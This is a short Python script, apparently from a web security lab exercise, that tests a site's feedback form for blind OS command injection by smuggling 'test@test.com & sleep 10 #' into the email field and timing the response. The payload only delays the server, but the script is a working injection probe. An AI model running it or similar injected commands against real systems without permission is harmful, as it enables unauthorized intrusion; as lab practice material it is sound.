import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies =  {
            "http" :"http://127.0.0.1:8080",
            "https":"http://127.0.0.1:8080"
            }


def get_csrf_token(session,url):
    feedback_path = "/feedback"
    response = session.get(url+feedback_path, verify=False,proxies=proxies)
    soup = BeautifulSoup(response.text,"html.parser")
    csrf = soup.find("input")["value"]
    return csrf

def check_command_injection(session,url):

    submit_feedback_path = '/feedback/submit'
    command_injection_payload = "test@test.com & sleep 10 #"
    csrf_token= get_csrf_token(session,url)
    data = {
        "csrf":csrf_token,
        "name":"test",
        "email": command_injection_payload,
        "subject":"test",
        "message":"test"
    }

    response = session.post(url+submit_feedback_path,data=data,verify=False,proxies=proxies)

    if response.elapsed.total_seconds()>=10 :
        print("(+) Email field vulnerable to time based command injection!")
    else:
        print("(-) Email field not vulnerable")




def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url> " % sys.argv[0])
        print("(+) Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]   # accessing the given arguments

    print("(+) Checking if email parameter is vulnerable to time based command injection...")
    s = requests.Session()
    check_command_injection(s,url)



if __name__ == "__main__":
    main()